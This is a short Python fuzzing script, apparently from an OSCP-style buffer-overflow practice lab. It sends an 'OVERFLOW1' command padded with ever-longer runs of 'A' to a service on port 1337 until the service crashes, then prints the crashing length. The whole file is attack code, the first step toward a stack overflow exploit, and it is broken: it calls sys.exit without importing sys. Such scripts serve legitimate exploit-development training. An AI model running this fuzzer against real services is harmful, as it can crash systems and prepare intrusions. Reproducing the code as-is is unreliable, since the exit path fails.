#!/usr/bin/env python3

import socket

host = "10.10.142.72"
port = 1337

cmd = "OVERFLOW1 "

payload = cmd + "A"*100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.recv(1024) # oscp banner
            print(f"Fuzzing with {len(payload) - len(cmd)} bytes..")
            s.send(bytes(payload, 'latin-1'))
            s.recv(1024) # overflow1 complete
    except:
        print(f"Fuzzing crashed with {len(payload) - len(cmd)}")
        sys.exit(0)

    payload += "A"*100

